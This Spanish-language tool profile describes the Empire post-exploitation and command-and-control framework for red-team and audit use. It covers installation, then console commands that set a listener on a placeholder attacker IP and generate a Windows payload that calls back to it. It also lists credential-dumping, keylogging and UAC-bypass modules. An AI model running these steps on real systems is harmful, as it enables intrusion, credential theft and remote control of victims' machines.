# Arsenal-de-un-analista---Herramienta-Empire

Empire (PowerShell Empire)
1. Nombre de la herramienta
Empire (conocida originalmente como PowerShell Empire)
________________________________________
2. Sitio oficial / URL
•	Repositorio oficial (BC-Security):
👉 https://github.com/BC-SECURITY/Empire
________________________________________
3. Tipo de herramienta
•	Post-explotación
•	Command and Control (C2)
•	Framework ofensivo
•	Red Team / Pentesting avanzado
________________________________________
4. Protocolos utilizados
Empire puede operar sobre distintos protocolos, dependiendo del listener configurado:
•	HTTP / HTTPS
•	TCP
•	SMB
•	DNS
•	ICMP (en algunos módulos)
________________________________________
5. Descripción de la herramienta
Empire es un framework de post-explotación diseñado para operar después de haber comprometido un sistema, permitiendo al atacante mantener acceso, ejecutar comandos, escalar privilegios, moverse lateralmente y exfiltrar información, todo ello sin necesidad de utilizar malware tradicional ni binarios externos.
Originalmente se basaba en PowerShell, pero actualmente soporta también:
•	PowerShell
•	Python
•	C# (.NET)
Una de sus principales ventajas es que trabaja mayormente en memoria, reduciendo la huella en disco y dificultando la detección por antivirus tradicionales.
Empire funciona bajo un modelo cliente-servidor (C2):
•	El servidor Empire gestiona listeners, agentes y módulos.
•	Los agentes se ejecutan en los sistemas comprometidos y se comunican periódicamente con el servidor.
________________________________________
6. ¿Para qué sirve?
Empire se utiliza principalmente para:
•	Mantener persistencia en sistemas comprometidos
•	Ejecutar comandos remotos
•	Realizar escaladas de privilegios
•	Dump de credenciales
•	Enumeración del dominio (Active Directory)
•	Movimiento lateral
•	Exfiltración de información
•	Simulación de ataques avanzados (APT) en ejercicios de Red Team
Es muy usado en:
•	Auditorías de seguridad
•	Ejercicios de Red Team / Blue Team
•	Laboratorios académicos
•	Simulación de ataques reales
________________________________________
7. Instalación de Empire
Requisitos previos
•	Sistema operativo Linux (recomendado: Kali Linux o Ubuntu)
•	Python 3
•	Git
•	Permisos de administrador
Instalación en Kali Linux
sudo apt update
sudo apt install -y git python3 python3-pip
Clonar el repositorio:
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
Ejecutar el instalador:
sudo ./setup/install.sh
Durante la instalación:
•	Se instalarán dependencias automáticamente
•	Se configurará la base de datos
•	Se pedirá crear credenciales de acceso
________________________________________
8. Puesta en marcha
Iniciar Empire:
sudo ./empire
Aparecerá la consola interactiva de Empire, desde la cual se gestionan todos los componentes.
________________________________________
9. Uso básico de Empire
9.1 Crear un listener (servidor C2)
listeners
uselistener http
set Host http://IP_ATACANTE
set Port 8081
execute
Esto crea un servidor al que se conectarán los agentes.
________________________________________
9.2 Generar un agente (payload)
usestager windows/launcher_bat
set Listener http
execute
El resultado es un payload que, al ejecutarse en la máquina víctima, establecerá conexión con Empire.
________________________________________
9.3 Gestión de agentes
Listar agentes activos:
agents
Interactuar con uno:
interact NOMBRE_DEL_AGENTE
________________________________________
9.4 Ejecución de módulos
Una vez dentro del agente:
usemodule situational_awareness/host/whoami
execute
Ejemplos de módulos:
•	Enumeración del sistema
•	Dump de credenciales
•	Bypass de UAC
•	Keylogging
•	Captura de pantallas
________________________________________
10. Ventajas de Empire
•	Operación en memoria (fileless)
•	Gran cantidad de módulos listos para usar
•	Soporte para Active Directory
•	Comunicación cifrada
•	Altamente configurable
•	Ideal para simulaciones realistas
________________________________________
11. Limitaciones y consideraciones
•	Requiere acceso previo al sistema
•	Detectable por soluciones EDR modernas
•	Uso indebido es ilegal
•	Requiere conocimientos técnicos avanzados
________________________________________
12. Casos de uso típicos
•	Auditoría de seguridad interna
•	Simulación de ataques persistentes
•	Formación en ciberseguridad ofensiva
•	Pruebas de detección en equipos Blue Team
________________________________________
13. Conclusión
Empire es una de las herramientas de post-explotación más completas y potentes disponibles actualmente. Su enfoque en ejecución en memoria, su arquitectura modular y su capacidad de operar sobre múltiples protocolos lo convierten en una solución ideal para ejercicios avanzados de Red Team y auditorías de seguridad profesionales.
